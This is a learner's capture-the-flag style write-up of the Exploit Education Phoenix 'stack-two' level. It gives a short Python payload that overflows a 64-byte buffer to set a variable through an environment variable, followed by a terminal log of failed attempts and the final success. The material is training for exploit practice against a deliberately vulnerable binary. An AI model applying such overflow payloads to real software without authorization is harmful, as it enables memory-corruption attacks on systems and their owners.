### Stacktwo 

This one was challenging for me to understand, I really really struggled with it even though it was easy.
First mistake that I had made was that I didnt read code carefully which lead me to not see that we need to set up the ExploiEducation 
Env variable, which is kinda terrible. An oversight like this really shows how much more i need to study and understand

Nevertheless Once I saw the solution online I was embarassed af and then went ahead to write the code to solve it.
Its technically the same except we need to pass answers via env var.
Also I was terribly embarassed that I had forgotten how to reverse a string in python

### Code
```python3
padding = 'A'*64
offset = '\x0d\x0a\x09\x0a'
print(padding+offset[::-1])

```

### Creds
```
No credentials/flag.
```

### Logs
```
➜  amd64 echo $(python3 -c 'print("A"*65+'\r\n\t\n')') | ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'rntn' is not defined
➜  amd64 out=$(python3 ~/code/stack-two.py)
➜  amd64 echo -ne $out | ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a
➜  amd64 out=$(python3 ~/code/stack-two.py)
➜  amd64 echo -ne $out | ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a
➜  amd64 echo $out | ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a
➜  amd64 python3 ~/code/stack-two.py| ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a
Exception ignored in: <_io.TextIOWrapper name='<stdout>' mode='w' encoding='UTF-8'>
BrokenPipeError: [Errno 32] Broken pipe
➜  amd64 (python3 ~/code/stack-two.py) ./stack-two
zsh: parse error near `./stack-two'
➜  amd64 $(python3 ~/code/stack-two.py) ./stack-two
zsh: command not found: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^M
➜  amd64 ./stack-two $(python3 ~/code/stack-two.py)
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a
➜  amd64 export ExploitEducation=$(python3 ~/code/stack-two.py) ./stack-two
export: not valid in this context: ./stack-two
➜  amd64 export ExploitEducation=$(python3 ~/code/stack-two.py) ;./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x090a0d41, we want 0x0d0a090a
➜  amd64 export ExploitEducation=$(python3 ~/code/stack-two.py) ;./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x0a090a41, we want 0x0d0a090a
➜  amd64 export ExploitEducation=$(python3 ~/code/stack-two.py) ;./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
➜  amd64 



```


 ~Kurama
